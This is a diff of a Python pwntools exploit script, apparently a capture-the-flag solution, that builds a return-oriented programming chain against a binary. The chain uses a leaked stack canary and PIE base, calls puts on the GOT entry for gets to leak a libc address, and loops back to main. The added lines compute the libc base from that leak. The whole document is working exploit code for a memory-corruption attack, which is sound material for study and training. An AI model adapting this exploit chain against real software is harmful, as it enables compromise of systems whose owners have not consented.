@@ -75,10 +75,20 @@ payload = padding
 payload += p64(canaryInt)
 payload += padOverBP
 payload += p64(popRdiRet)   # 
-payload += p64(PIEBase + elf.got["gets"])   # Cause next loop to get input
+payload += p64(PIEBase + elf.got["gets"])   # Address to leak? or to call gets?
 payload += p64(PIEBase + elf.plt["puts"])   # Print out leak to find base of libc
-payload += p64(PIEBase + elf.symbols.main)  # Cause the infinite loop to happen
+payload += p64(PIEBase + elf.symbols["main"])  # Cause the infinite loop to happen
 
 # Send payload then recieve
 p.sendline(payload)
-print(p.recv())
+p.recvline()
+
+# Set up libc leak!
+libcLeak = u64(p.recvline().strip() + b"\x00\x00")      # Makes it into decimal number, unsigned, also is the address of gets whic his recieved
+print("LIBC LEAK: ",hex(libcLeak))
+
+# Calculate base
+libcBase = libcLeak - libc.symbols['gets'] - 0x9e0
+print("LIBC BASE:", hex(libcBase))
+
+#
